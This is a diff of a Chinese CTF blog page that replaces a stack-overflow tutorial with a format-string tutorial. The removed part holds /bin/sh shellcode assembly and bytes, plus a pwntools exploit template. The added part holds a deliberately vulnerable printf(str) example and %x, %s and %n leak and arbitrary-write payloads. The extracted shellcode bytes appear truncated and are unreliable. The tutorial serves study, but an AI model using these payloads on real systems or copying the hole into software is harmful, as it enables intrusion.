@@ -12,7 +12,7 @@
     
     <title>
         
-            栈溢出指南 | 
+            格式化字符串漏洞 | 
         
         mian&#39;s blog
     </title>
@@ -36,7 +36,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="mian">
     <meta name="description" itemprop="description" content="这是mian的博客">
-    <meta name="keywords" content=",pwn,栈">
+    <meta name="keywords" content=",ctf">
 
     <!-- Site Verification -->
     
@@ -65,10 +65,10 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://yoursite.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="栈溢出指南 | mian&#39;s blog">
+    <meta property="og:title" content="格式化字符串漏洞 | mian&#39;s blog">
     <meta property="og:image" content="/img/pic.png" />
     <meta property="og:description" content="这是mian的博客">
-    <meta property="og:article:tag" content="pwn"> <meta property="og:article:tag" content="栈"> 
+    <meta property="og:article:tag" content="ctf"> 
 
     
         <meta property="article:published_time" content="6月 14, 2018" />
@@ -76,7 +76,7 @@
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="栈溢出指南 | mian&#39;s blog">
+    <meta name="twitter:title" content="格式化字符串漏洞 | mian&#39;s blog">
     <meta name="twitter:description" content="这是mian的博客">
     <meta name="twitter:image" content="/img/pic.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -84,7 +84,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://yoursite.com/2018/06/14/栈溢出指南/index.html" />
+        <link rel="canonical" href="http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -110,8 +110,8 @@
         },
         "description": "你好，我是mian，欢迎来到我的博客"
     },
-    "headline": "栈溢出指南",
-    "url": "http://yoursite.com/2018/06/14/栈溢出指南/index.html",
+    "headline": "格式化字符串漏洞",
+    "url": "http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html",
     "datePublished": "6月 14, 2018",
     "dateModified": "6月 14, 2018",
     "description": "这是mian的博客",
@@ -327,7 +327,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#栈溢出简易指南"><span class="post-toc-number">1.</span> <span class="post-toc-text">栈溢出简易指南</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#主题："><span class="post-toc-number">1.1.</span> <span class="post-toc-text">主题：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shellcode"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">shellcode</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#shellcode的编写"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">shellcode的编写</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-address"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">return-to-address</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EIP的定位"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">EIP的定位</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp的写法"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">exp的写法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-register-绕过aslr"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">return-to-register(绕过aslr)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实现"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">实现</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#局限"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">局限</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-libc-绕过NX"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">return to libc(绕过NX)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据执行保护"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">数据执行保护</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理-1"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">利用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#局限-1"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">局限</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#格式化字符串漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">格式化字符串漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#引例"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">引例</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#x查看栈的内容-s查看地址上的内容"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">%x查看栈的内容%s查看地址上的内容</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sprint触发栈溢出"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">sprint触发栈溢出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意内存写"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">任意内存写</span></a></li></ol></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -365,7 +365,7 @@
         
     
             <p class="article-headline-p">
-                栈溢出指南
+                格式化字符串漏洞
             </p>
         </div>
 
@@ -406,7 +406,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACd0lEQVR42u3aQXLCMBAEQP7/afKAFM6M1lKcVPtEgQvUPmiX0b7e//p64eHh4eHh4eHhPYz3iq/r+79/56d3Pn16/X6yNjw8PLyTvB+22svFXd+Tv/70KPO14eHh4Z3n5T+Tl4rrJeafFmvDw8PDexgvKQyTcjIvHnh4eHhP4yUhwvU9yTt4eHh4f4XXNr5JY52EvElhOJS14OHh4cW89gDs5OtfON/Dw8PDu+TVI02DZSXhRVIMiqErPDw8vA28PCZoI4m1Qas2Gl7MWvDw8PBu4rWH+smPzZvp+qHg4eHhbeZN4oCkeORFZS16wMPDwzvPy//8r8HW2uXkSOzjI8PDw8PbzGsb4vbIf95818MEeHh4eEd4+babbOLtp3koHMXKeHh4eJt57SY+P/JvAfX34+Hh4R3k3bY1lwUgb51viHHx8PDwxrw59b10JaFwO/6Fh4eHd4ZXh6TxYEHbjue8Hx49Hh4e3mbe2gFY3li3kfHkNR4eHt5JXrKs4gfKEHbtSKz+x4CHh4e3gbe4EZdx7VrxKAJiPDw8vM28yXY/iSfWyk8UcODh4eFt5uXbcXvn2sNaC3zx8PDwzvPaKHYywJqUlvZh4eHh4Z3k5W1rPibVDktNGvH6HwMeHh7emNde7UDVWlGZHIPh4eHh7ebdNXKat8tt4akDETw8PLwjvDzYbZe71kAna4hiXDw8PLzNvLYY7IC1AcdtMS4eHh7eNl5+EHW9lHy5dZyBh4eH90heMi4weRBJk33z6AAeHh7eEi/ZiKMgNRgvSB7NYruPh4eHd4Q3DwJuO74qI90towN4eHh4l7z/d+Hh4eHh4eHh4T3g+gIRZkoVvHt6EwAAAABJRU5ErkJggg==">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC2ElEQVR42u3aUW7jMAwFwNz/0ukBgiiPpNs60virCBzZwwDLFZ8ezyOvBzY2NjY2NjY2NvYt2Y/4er3/7QOW979b+d06yQrrd8bGxsY+gf3hn/7XJfKHLT9JVkjeJ3pnbGxs7APY64aRl2Ne0Pxb+TtjY2NjY6+3Ir11kgaZfBcbGxsbu/e6+SYhL2V1e4ONjY2NPfmv/2RUlBfosk0ONjY29tbsatB7h7//Id/GxsbGviW7euXNrNcae7Fu9ObY2NjYm7KTh/WGTdWi9I5jFo4KYWNjY2/N7rWl/HDPfCCVPHddOGxsbOy92UkTqm4b8hbYa43l5oeNjY29NXsyGMrbVS+KyNf58JNgY2NjH8DuXb2DOJOmmPxUl+Xb2NjY2Ldn5/Ftb+TUG/RXCx2FytjY2Nhbs3sNo3rPpMlV44GogWFjY2NvxB4dhQnG+tXgthoMR6ECNjY29jHs6gg+KVaPsW6Eyc+GjY2NfQK72k56bay6/lVtDBsbG/sc9lWbkzx8Te5MRv/NeAAbGxt7O3YvQM0fWY1759sSbGxs7DPZ1UONeTQ7QVaHVuUGho2Njf3l7MLXikd25puKXvCMjY2NfRq72paSkdB65FQdHvUa2wVBLzY2NvZXsRPeZBPSCwzyYmFjY2OfzM5DgqQEVcz687yxRZsWbGxs7E3ZSdtY3987jlONE3pFxMbGxj6BPRnQ51uXakOah9DY2NjYJ7OrTehvitgLIbCxsbFPYOcLVePh3ueTYGCUb2NjY2N/Lbt69QDV4ztJ6ZM1sbGxsU9g9xrDZINRLcq6BIVWio2Njb01u9q0ei9abU7VQLoQD2BjY2Nvyq5uCa4KeqthQ69ZYmNjY2P3mscEn2+QoqJjY2NjY4/Dg94oanKUBxsbG/s09jzcTY7gFFpOTI3aLTY2NvbW7F7Qm7/KZAjVK8Ev5tvY2NjYN2Ofc2FjY2NjY2NjY2Pf5voB7ml77noRxJcAAAAASUVORK5CYII=">
     
 </ul>
     
@@ -419,7 +419,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/pwn/">pwn</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/栈/">栈</a>
+        <a class="post_tag-link" href="/tags/ctf/">ctf</a>
     </ul>
     
 
@@ -435,7 +435,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=栈溢出指南&url=http://yoursite.com/2018/06/14/栈溢出指南/index.html&pic=&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=格式化字符串漏洞&url=http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html&pic=&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -444,7 +444,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=栈溢出指南&url=http://yoursite.com/2018/06/14/栈溢出指南/index.html&via=mian" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=格式化字符串漏洞&url=http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html&via=mian" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -453,7 +453,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/14/栈溢出指南/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -462,7 +462,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/14/栈溢出指南/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/14/格式化字符串漏洞/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -486,197 +486,58 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>一个关于栈溢出的指南</p>
-<h1 id="栈溢出简易指南"><a href="#栈溢出简易指南" class="headerlink" title="栈溢出简易指南"></a>栈溢出简易指南</h1><h2 id="主题："><a href="#主题：" class="headerlink" title="主题："></a>主题：</h2><ul>
-<li><p>基本栈溢出</p>
-</li>
-<li><p>针对缓存区溢出防护的对策</p>
-</li>
-</ul>
+        <p>printf家族的格式化漏洞</p>
+<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串漏洞主要出现在printf家族中，当程序员为了偷懒将从用户处读入的字符串直接输出时，可能会触发格式化字符串漏洞，例如以下代码。</p>
+<pre><code>printf(&quot;%s&quot;,str)//这是安全的
+printf(str)//这是危险的
+</code></pre><p>虽然说printf的第一个参数一定会输出，但是如果在其中拥有格式字符的话，就会从堆栈中找到一个变量的参数值进行输出，从而输出本不应该输出的内容。</p>
 <hr>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>栈溢出的最终目的是执行shellcode，夺取shell，因此本文将会从shellcode开始讲起。</p>
-<p>shellcode通常是软件漏洞利用中的一小段代码，主要用于启动shell或干一些奇怪的事来让攻击控制正台机器</p>
+<h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><p>以下我将把一段c++代码作为例子解析原理</p>
+<pre><code>#include &lt;iostream&gt;
+using namespace std;
+int main()
+{
+    char str[100];
+    cin &gt;&gt; str;
+    printf(str);
+    system(&quot;pause&quot;);
+}
+</code></pre><p>这段代码就会出现此类bug</p>
 <blockquote>
-<p>\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x46\x55\x43\x4b\x0a</p>
+<p>%s<br>閴J</p>
 </blockquote>
-<p>这段代码的就是一段shellcode，其功能为</p>
-<pre><code>print(&quot;fuck&quot;);
-return 0;
-</code></pre><p>当然，想要写一段shellcode也不是特别难，主要流程为</p>
-<blockquote>
-<p>使用c语言描述shellcode要完成的逻辑功能<br>将C语言翻译成汇编语言<br>编译和测试<br>测试通过后提取机器码</p>
-</blockquote>
-<p>有两个书写shellcode时需要注意的问腿</p>
-<blockquote>
-<p>由于缓存区漏洞是由于无长度限定的print家族（输入的是字符串，依靠’\0’(ascii码为0)结尾）造成的，所以shellcode不能有0字节，否则会被截断。<br>由于漏洞一般不能溢出无限大的字符串，所以不应该过于长。</p>
-</blockquote>
-<p>shellcode一般达成以下功能</p>
-<blockquote>
-<p>提升权限为root，即调用suid(0)<br>启开bash，全面控制系统，即调用execve(“/bin/bash, NULL, NULL);<br>打开网络端口，让攻击者连接该端口进行控制<br>反向连接攻击者提供的端口，进行反向控制。（反弹shell）</p>
-</blockquote>
+<p>其中“閴J”这个奇怪的字符串就是从内存里读出来的<br>假如我们不使用%s这样的目的较纯粹的格式化字符，而是使用%n、%x这样恶意满满的格式化字符就会导致任意写或者堆栈中的东西被泄露出去。</p>
 <hr>
-<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><p>虽然现在到处都可以找到现成的shellcode，但是我认为到还是有必要学习shellcode的编写。</p>
-<p>下面我将阐述关于shellcode编写构成中的小问题的解决</p>
-<p>虽然说由于栈溢出的漏洞多半是不能在构成参数的字节里中出现0。但是很明显，在代码中多半会出现0。</p>
-<p>例如：</p>
+<h2 id="x查看栈的内容-s查看地址上的内容"><a href="#x查看栈的内容-s查看地址上的内容" class="headerlink" title="%x查看栈的内容%s查看地址上的内容"></a>%x查看栈的内容%s查看地址上的内容</h2><p>内容如下</p>
 <blockquote>
-<p>MOV eax,0<br>MOV eax,0x00000005(前三个字节都是零会把作为参数的字符串截断)</p>
+<p>%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p>
 </blockquote>
-<p>有以下两个方法可以解决这个问题，完成寄存器清零与给寄存器赋予一个极小的数。</p>
+<p>-—-结果—-</p>
 <blockquote>
-<p>xor eax eax 这样就可以将将eax置零<br>还有cld可以将edx进行置零</p>
+<p>11d108211d10825b1000cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc7825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325000000000000(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)</p>
 </blockquote>
-<p>如果需要将eax的值赋为0x5，不能直接写成mov eax, 0x05，因为它会生成机器码mov eax, 0x00000005，会有0填充（因为一个字节只能有8位你丢进去了32位那自然会有数据为零的内存基本单元出现）。</p>
-<p>可以采用下面这个技巧：</p>
-<blockquote>
-<p>xor eax, eax<br>mov al, 0x05</p>
-</blockquote>
-<p>虽然说在有些情况下，我们可以知道shellcode的绝对地址，从而跳转到shellcode处，但是在有些情况下shellcode中shellcode的位置是会变化的，这导致了shellcode所要填写的地址难以确定。但是我们可以使用另一个技巧来进行处理。<br>例如call技术：<br>call指令是相对转跳，但会在栈上压上绝对地址，然后再弹出就可以获取绝对地址</p>
-<pre><code>jmp short get_string
-code:
-       pop eax            ; 这里弹出的是call指令压栈的下条指令的地址，即&quot;hello world&quot;字符串的地址
-get_string:
-      call code
-data:
-db &apos;hello world&apos;, 0x0a
-</code></pre><p>linux系统调用是通过 int 0x80来陷入内核态的，在此过程中系统调用号通过eax来传递，而参数则是通过ebx，ecx,edx，esi来传递的。</p>
-<p>在补充了这些基础知识后我们开始真正的着手开始编写shellcode,可以直接使用gcc对汇编文件.S进行编译链接，生成标准的可执行ELF文件，同时也是直接进行测试，但又一点不方便的是提取机械码很不方便。</p>
-<p>为了提高提取机械码的效率，nasm编译器生成bin格式文件，而且没有其他东西，棒棒哒</p>
-<p>例如我们想要书写一个夺取shell的shellcode，我们需要书写的核心代码是</p>
-<pre><code>char *argv[2];
-
-argv[0] = &quot;/bin/sh&quot;;
-argv[1] = NULL;//指针数组需要以NULL结束不然会接着寻找接下去的指针
-
-execve(&quot;/bin/sh&quot;, argv, NULL);//execve是内核级系统调用，第二个参数为数组指针，第三个参数为新的环境变量
+<p>ps.请注意这样子操作访问的地址从高到低（堆栈从低向高利用）一个%x刚好跳过一个地址。</p>
+<hr>
+<h2 id="sprint触发栈溢出"><a href="#sprint触发栈溢出" class="headerlink" title="sprint触发栈溢出"></a>sprint触发栈溢出</h2><p>例如</p>
+<pre><code>char user[]=&quot;%496d\x39\x4a\x42\x00&quot;;
+char outbuf[512];
+char buffer[512]
+sprintf(buffer,&quot;ERR Wrong command：%.400s&quot;,user);
 </code></pre><blockquote>
-<p>excve的系统调用号为11</p>
+<p>两个16进制表示一个字符，以这种方式将他们捆成整体，这样子会两个16进制会作为一个整体写入而不是作为两个字符写入毕竟我们需要在内存中写入的是00434a39而不是16个16进制。也只有以这种方式才能在内存中写入00434a39</p>
 </blockquote>
-<p>接下来我们将会将其转化为汇编代码（需要注意寄存器传参这一情况）<br>先将字符串压到栈上</p>
-<pre><code>xor edx, edx
-push edx
-push 0x68732f2f
-push 0x6e69622f
-</code></pre><p>这样子压入了”/bin/sh”，应该注意因为地址是从高地址向低地址蔓延的，所以需要从字符串的尾巴开始压起。</p>
+<p>这里有一个小技巧利用%496d，快速向buffer里面丢垃圾这样子就往栈中存放eip的位置写入了“00434a39”</p>
 <blockquote>
-<p>字符串在内存中的分布如下<br>低 结束’\0’<br>↑↑ 第三部分<br>↑↑ 第二部分<br>高 第一部分<br>换言之，栈顶指向的永远是一块数据的开始</p>
+<p>低&emsp; 临时变量3 EBP-xxx<br>↓↓&emsp;  临时变量2 EBP-xxx<br>↓↓&emsp;  临时变量1 EBP-xxx<br>↓↓&emsp;  &lt;——EBP<br>↓↓&emsp; EBP原值<br>↓↓&emsp; EIP原值<br>↓↓&emsp; 参数1<br>↓↓&emsp; 参数2<br>高&emsp; 参数3</p>
 </blockquote>
-<blockquote>
-<p>由于我们需要让shellocde尽可能的短，所以我们不需要将没用的数据从堆栈中拿出，只需要简单的弃用就可以了</p>
-</blockquote>
-<p>紧接着将这个字符串的指针也就是现在的栈顶取出,并压入栈中</p>
-<pre><code>mov ebx,esp
-push ebx
-</code></pre><p>由于我们前面所对edx做的操作使得edx的值是0（即NULL）所以只需要</p>
-<pre><code>push edx
-</code></pre><p>就把argv的数据全放在栈里了，然后</p>
-<pre><code>mov ecx,esp
-</code></pre><p>最后把系统调用号即11赋给eax</p>
-<pre><code>xor eax eax
-mov al 0xb
-</code></pre><p>这样操作过后，eax为系统调用号，ebx为“/bin/sh”，ecx为argv，edx为新的环境变量，大功告成，紧接着我们</p>
-<pre><code>int 0x80
-</code></pre><p>进行系统调用，大功告成。拼接过后的代码为</p>
-<pre><code>BITS 32  
-
-xor edx, edx  
-push edx  
-push 0x68732f2f  
-push 0x6e69622f  
-
-mov ebx, esp  
-
-push edx  
-push ebx  
-
-mov ecx, esp  
-
-xor eax, eax  
-mov al, 0xb  
-
-int 0x80  
-</code></pre><p>编译生成机器码</p>
-<pre><code>nasm -o shell2 shell2.s
-</code></pre><p>生成的shell2文件为bin数据，全是机器码，没有任何格式数据，使用Linux命令转换成bash或者perl可输入的shellcode.</p>
-<pre><code>$ od -t x1 shell2 | sed -e &apos;s/[0-7]*//&apos; | sed -e &apos;s/ /\\x/g&apos;
-</code></pre><p>得到</p>
-<blockquote>
-<p>\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52<br>\x53\x89\xe1\x31\xc0\xb0\x0b\xcd</p>
-</blockquote>
-<p>这就是我们的shellcode了</p>
+<p>调用函数附近的内存情况</p>
 <hr>
-<h2 id="return-to-address"><a href="#return-to-address" class="headerlink" title="return-to-address"></a>return-to-address</h2><p>有了以上的这些知识我们就可以使用最为简单的ret2addr攻击了。<br>技术的核心是使用覆盖EIP来返回到确认地址，虽然十分简单粗暴，但是随着32位与64位的普及与alsr技术的普及逐渐失去功效，但是在某些特殊的场合这种技术仍然闪烁着光辉。千里之途，始于足下，下面让我们来学习这门技术吧。</p>
-<p>首先我们先温习一遍内存中的数据存放</p>
+<h2 id="任意内存写"><a href="#任意内存写" class="headerlink" title="任意内存写"></a>任意内存写</h2><p>先通过这样的方式确定那个字符串放在那里<br>输入<br><code>AAAA %08x %08x %08x %08x %08x %08x %08x</code> </p>
 <blockquote>
-<p>低  临时变量3 EBP-xxx<br>↓↓  临时变量2 EBP-xxx<br>↓↓  临时变量1 EBP-xxx<br>↓↓  &lt;——EBP<br>↓↓  EBP原值<br>↓↓  EIP原值<br>↓↓  参数1<br>↓↓  参数2<br>高  参数3</p>
-</blockquote>
-<blockquote>
-<p>内存的操作数据的存放顺序是反过来的哦</p>
-</blockquote>
-<p>这一种存储方式虽然高效但是会有一个致命的弱点，那就是内存中临时变量被溢出会把EIP盖掉，导致程序流就会走向你想要的任何地方（前提是没开canary等等的保护，绕过它们的方法以后会写）。</p>
-<p>所以你需要知道shellcode在哪儿，才能精确的跳转至shellcode。这也就是为什么这种技术被称为热ret2addr。一般来说我们会在盖掉EIP的时候顺便在下面写下shellcode所以这个地址我们一般也是知道的。</p>
-<p>在进行这种溢出的过程中我们一般需要确认EIP的地址才可以进行精准的覆盖，不至于让我们的程序滑到谁也不知道的地方去。</p>
-<h3 id="EIP的定位"><a href="#EIP的定位" class="headerlink" title="EIP的定位"></a>EIP的定位</h3><p>有两种方法：<br>1.不停地向新开的程序里丢大小不同的垃圾最后当程序因为异常退出时就可以知道EIP的地址了。<br>2.通过ida看当前栈帧里的内容决定丢多少垃圾进去。<br>有些情况下会发生栈帧很大导致难以试出EIP或者ida分析不出的情况，可以考虑我的另一篇博客的所写的gdb-peda中的pattern大法。</p>
-<h3 id="exp的写法"><a href="#exp的写法" class="headerlink" title="exp的写法"></a>exp的写法</h3><p>通用模板</p>
-<pre><code># -*- coding:utf-8 -*-
-from pwn import *
-
-sh = remote(&quot;????&quot;,????) # 与服务器交互
-junk = &apos;a&apos;*0x?? # 填充
-fakebp = &apos;a&apos;*8# 淹没bp
-syscall = ?????????????
-payload = junk + fakebp + p64(syscall) # p64对整数进行打包
-sh.send(payload)
-sh.interactive() # 直接反弹shell进行交互
-</code></pre><blockquote>
-<p>更改？？？？？的内容就可以了。</p>
+<p>\x58\x74\x04\x08%.Md%n<br>形如这样的代码可以在08047458中写入一个M+4<br>大致原理基本如此</p>
 </blockquote>
 <hr>
-<h2 id="return-to-register-绕过aslr"><a href="#return-to-register-绕过aslr" class="headerlink" title="return-to-register(绕过aslr)"></a>return-to-register(绕过aslr)</h2><p>虽然说我们上文的技术十分有效，但是魔高一尺，道高一丈，安全技术人员发明了aslr技术对程序进行保护使得偏移量甚至达到2g，这让我们难以确认shellcode的真正位置。</p>
-<blockquote>
-<p>aslr在linux系统上是一个编译选项而非像windows一样是一个链接选项。linux的alsr安全性高于windwos，但是会拖累程序的运行速度，所以aslr在linux上并非很普遍。</p>
-</blockquote>
-<blockquote>
-<p>因为alsr会把栈的基址与栈帧随机掉，那么我们就不知道我们的shellcode会随机到哪里去了。而且确认EIP位置也成了一大难题，因为栈帧的变动会导致EIP变动。</p>
-</blockquote>
-<p>但是真正的黑客从不畏惧艰难，勇于向不可能发起挑战，他们发明了ret2reg技术（当然nop-slide之类的技术也可以做到）</p>
-<blockquote>
-<p>当然aslr+pie依然可以干掉这些大胆的黑客，当然这就是后话了。<br>IDE的优化也可以，（笑</p>
-</blockquote>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>系统中的某一些函数会将当前栈帧的地址暴露出来，尤其是处理字符串等。有些情况下会把地址暴露到寄存器中。那么我们在写入shellcode后可以通过寄存器定位，然后在EIP中跳到寄存器位置加上相对偏移。</p>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>如果你一步步按这个方法进行操作的话，你会碰到一个问题。你需要进行</p>
-<pre><code>call xxx
-//jump xxx
-</code></pre><p>但是它们在哪呢，我应该怎么样在程序中EIP中填写地址才能跳到那儿呢。aslr有一个特点可以帮助我们解决这个问题，那就是</p>
-<blockquote>
-<p>前文提到使用 echo 2 &gt; /proc/sys/kernel/randomize_va_space 命令将地址混淆技术启用，但该技术对栈空间，堆地址和动态库加载空间都进行了混淆，唯独没有对程序做地址混淆。<br>事实上Linux gcc编译器提供了-fPIE选项，但用它来编译，可使程序空间做地址混淆，造成整个进程地址混淆。但一般的开源软件和商用Linux发行商的服务进程并没有使用-fPIE进行安全增加，还是留下了可利用空间。注意到， stack2在编译时没有使用-fPIE选项。</p>
-</blockquote>
-<p>我们可以通过objdump和grep命令来寻找call xxx相关的指令，然后在EIP中覆写这个地址，然后想办法把shellcode放到寄存器所在的地址去。然后就成功了。</p>
-<h3 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h3><p>如果程序中的寄存器指的地方你覆写不了（比如说在溢出点上面），或者下面的程序修改了这个寄存器的值，那这个方法就无能为力了。</p>
-<hr>
